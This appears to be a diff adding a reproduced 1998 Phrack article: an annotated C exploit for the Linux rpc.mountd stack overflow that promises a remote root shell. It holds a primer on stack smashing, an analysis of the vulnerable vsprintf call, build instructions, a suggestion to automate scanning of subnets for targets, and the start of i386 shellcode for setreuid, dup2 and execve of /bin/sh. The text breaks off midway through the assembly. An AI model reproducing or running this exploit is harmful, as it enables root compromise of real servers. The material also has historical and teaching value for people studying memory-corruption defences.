@@ -1,0 +1,255 @@
+A CASE STUDY: LINUX MOUNTD STACK OVERFLOW
+
+There is nothing new here, but the code is a text book example of how buffer
+overflows are done. Even if you have read other articles on buffer overflows
+you might find something of value in here. Or maybe not. The case studied
+is the Linux nfsd/mountd vulnerability mentioned in the CERT advisory on
+Aug 28.
+
+nuuB
+
+
+<++> linenoise/mountd-sploit.c
+/*
+ * mountd-sploit.c - Sploit for Linux mountd-2.2beta29+ (and earlier). Will
+ *                   give a remote root shell.
+ *
+ * Cleaned up, documented and submitted to Phrack on Sep 3 1998.
+ *
+ * I've included a quick primer on stack overflows and made lots of comments
+ * in the code, so if you don't know how these stack overflow exploits work
+ * take this opportunity to learn something.
+ *
+ * It is trivial to extend the code (or use scripting) to make something that
+ * automatically scans subnets or lists of IPs to find vulnerable systems.
+ * This is left as an exercise for the enterprising young hax0rs out there.
+ *
+ * You need the following RPC files for your particular architecture:
+ *
+ *   nfsmount.h
+ *   nfsmount_xdr.c
+ *
+ * These can be generated from 'mount.x' by the 'rpcgen' utility. I simply
+ * lifted the files that came pre-generated with Linux 'mount'. These are
+ * included uuencoded, but they may not work on your particular system. Don't
+ * bug me about this.
+ *
+ * Compile with:
+ *
+ * cc mountd-sploit.c nfsmount_xdr.c -o mountd-sploit
+ *
+ * Have fun, but as always, BEHAVE!
+ *
+ * /nuuB
+ *
+ */
+
+/*
+  A QUICK PRIMER ON STACK OVERFLOWS
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Read Aleph1's article in Phrack Issue 49 File 14 (P49-14) for a detailed
+  explanation on how to write sploits (the examples are for Linux/i386 but
+  the methodology is valid for any Unix, and can be applied to other OS's
+  once you understand the technique). If you are targeting one of Bill's OS
+  check out cDc #351: "The Tao of Windows Buffer Overflow" by DilDog.
+
+  The properties that we take advantage of are:
+  
+  * The stack memory pages have the execute bit set
+  * The return address from functions are stored on the stack on a higher
+    address than the local variables.
+
+  MEMORY MAP
+   
+   -- Start of stack (i.e bottom of stack - top of memory) e.g 0xc0000000 --
+    <environment variables>
+    <stack frames from main() down to the function calling our function>
+    <arguments to the vulnerable function>
+    <** return address **>
+    <frame pointer for prev frame - unless compiled with -fomit-frame-pointer>
+    <local variables for the vulnerable function>
+   -- Top of stack (lower memory address) e.g 0xbffff9c8 --
+
+  THE OVERFLOW
+
+  The trick is to overflow a local variable that is set through a function
+  that doesn't check for overflows (strcpy, sprintf, etc). By supplying a
+  (too) long string you can overwrite memory at higher addresses, i.e closer
+  to the start of the stack. More specifically we want to overwrite
+  <** return address **> with a pointer that points back into the stack that
+  contains code we want executed. Getting the code on the stack is done by
+  including it in the string we are overflowing with, or by placing it in
+  an environment variable.
+
+  The code can do anything you like, but the standard thing is to execve()
+  a shell. There are often limitations on what the code can look like in
+  order to be placed unmangled on the stack (length, touppper(), tolower(),
+  NULL bytes, path stripping etc). It all depends on how the target program
+  processes the input we feed it. Be prepared for some tinkering to avoid
+  certain byte patterns and to make the code use PC/IP relative addressing.
+
+  The overflow string (called the 'egg') is normally passed to the
+  target program through command line arguments, environment variables,
+  tcp connections or in udp packets.
+
+  POSSIBLE COMPLICATIONS
+
+  Sometimes you will destroy other local variables with your egg (depends on
+  how the compiler ordered the variables on the stack). If you use a long
+  enough egg you could also trash the arguments to the function. As your code
+  isn't executed until the vulnerable function returns (not at the return of
+  the function doing the actual overflowing, e.g strcpy()), you must make sure
+  that the corrupted variables don't cause a crash before the return. This
+  means that your egg probably has to be aligned perfectly, i.e only use one
+  return pointer and preceed it with 'correct' values for the local variables
+  you are trashing. Unfortuntely the ordering of the variables is often
+  dependent on what compiler options were used. Optimization in particular
+  can shuffle things around. This means that your exploit will sometimes have
+  to target a particular set of options.
+
+  Most of the time the trashing of other local variables isn't a problem but
+  you may very well run into it some day.
+
+  THE RETURN POINTER
+
+  The only problem left is to guess the right address to jump to (i.e the
+  return pointer). This is done either by trial and error or by examining the
+  executable (requires you have access to a system identical to the target).
+  A good way to get a reasonable starting value is to find out how much
+  environment variables the target process has (hint: use 'ps uxawwwwwwwwe')
+  and combine that with the base stack pointer (you can find that out with
+  a one line program that shows the value of the stack pointer).
+  To increase the chances of success it is customary to fill out the start of
+  the egg with NOP opcodes, thus as long as the pointer happens to point
+  somewhere in the egg before the actual code it will execute the NOPs
+  then the code.
+
+  That is all there is to it.
+
+*/
+
+
+/*
+ * Now, back to our case study.
+ *
+ * Target: rpc.mountd:logging.c
+ *
+ * void Dprintf(int kind, const char *fmt, ...) {
+ *   char buff[1024];
+ *   va_list args;
+ *   time_t now;
+ *   struct tm *tm;
+ *
+ *   if (!(kind & (L_FATAL | L_ERROR | L_WARNING))
+ *      && !(logging && (kind & dbg_mask)))
+ *          return;
+ *   ...
+ *   vsprintf(buff, fmt, args);   <-- This is where the overflow is done.
+ *   ...
+ *   if (kind & L_FATAL)
+ *       exit(1);
+ * }   <-- This is where our code (hopefully) gets executed
+ *
+ * This function is called from (e.g) mountd.c in svc_req() as follows:
+ *
+ * #ifdef WANT_LOG_MOUNTS
+ *     Dprintf(L_WARNING, "Blocked attempt of %s to mount %s\n",
+ *             inet_ntoa(addr), argbuf);
+ * #endif
+ *
+ * Looks great (WANT_LOG_MOUNTS appears to be defined by default). Type
+ * L_WARNING is always logged, and all we have to do is to try to mount
+ * something we are not allowed to (i.e as long as we are not included in
+ * /etc/exports we will be logged and get a chance to overflow). 
+ *
+ * The only complication is the first %s that we will have to compensate for
+ * in the egg (our pointers must be aligned correctly).
+ *
+ * We use 5 pointers to avoid problems related to how the compiler organized
+ * the variables on the stack and if the executable was compiled with or
+ * without -fomit-frame-pointer.
+ *
+ * 3 other local variables (size=3*4) + 1 frame-pointer + 1 return pointer = 5
+ *
+ * Still plenty of room left for NOPs in the egg. We do have to make sure that
+ * if the 3 other variables are trashed it won't cause any problems. Examining
+ * the function we see that 'now' and 'tm' are initialized after the vsprintf()
+ * and are thus not a problem. However there is a call 'va_end(args)' to end
+ * the processing of the ellipsis which might be a problem. Luckily this is
+ * a NOP under Linux. Finally we might have trashed one of the arguments
+ * 'kind' or 'fmt'. The latter is never used after the vsprintf() but 'kind'
+ * will cause a exit(1) (bad!) if kind&L_FATAL is true (L_FATAL=0x0008).
+ * Again, we are in luck. 'kind' is referenced earlier in the function and in
+ * several other places so the compiler has gratiously placed it in a register
+ * for us. Thus we can trash the arguments all we want.
+ * 
+ * Actually, if you examine the executables of mountd in the common distros
+ * you will find that you don't have to trash any variables at all as 'buffer'
+ * is placed just before the frame pointer and the return address. We could
+ * have used a simple egg with just one pointer and this would have worked
+ * just as well in practise.
+ *
+ * All this 'luck' is in fact rather common and is the reason why most buffer
+ * overflows are easy to write so they work most of the time.
+ *
+ * Ok. Delivery of the egg is done through the RPC protocol. I won't go into
+ * details here. If you are interested, get the sources for the servers and
+ * clients involved. Half the fun is figuring out how to get the egg in place.
+ *
+ * The last piece of the puzzle is to keep shoveling data from the local
+ * terminal over the TCP connection to the shell and back (remember that
+ * we used dup2() to connect the shell's stdout/in/err to the TCP connection).
+ *
+ * Details below.
+ */
+
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <signal.h>
+
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <rpc/rpc.h>
+#include <rpc/pmap_prot.h>
+#include <rpc/pmap_clnt.h>
+
+#include "nfsmount.h"
+
+/* 
+ * First we need to write the code we want executed.
+ *
+ * C0de: setreuid(0, 0); fork(); dup2(0, 1); dup2(0, 2); execve("/bin/sh");
+ *
+ * setreuid() is probably not necessary, but can't hurt.
+ *
+ * fork() is done to change pid. This is needed as someone - probably the
+ * portmapper - sends signals to mountd (the shell has no handlers for these
+ * and would die).
+ *
+ * The dup2()'s connect stdout/stderr to the TCP socket.
+ *
+ * The code assumes 'mountd' communicates with the client using descriptor
+ * zero. This is the case when it is started as a daemon, but may not be so if
+ * it is launched from inetd (I couldn't be bothered to test this). The
+ * dup2()'s may need to be changed accordingly if so.
+ *
+ * For Linux/i386 we would get:
+ */
+
+#if 0
+
+void c0de() {
+  __asm__(
+	  "jmp .get_string_addr\n\t" /* Trick to get address of our string */
+	  ".d01t:\n\t"
+
+	  "xorl %eax,%eax\n\t"
+	  "movl %eax,%ebx\n\t"  /* ruid=0 */
+	  "movl %eax,%ecx\n\t"  /* euid=0 */
+	  "movb $0x46,%eax\n\t" /* __NR_setreuid */
+	  "int $0x8
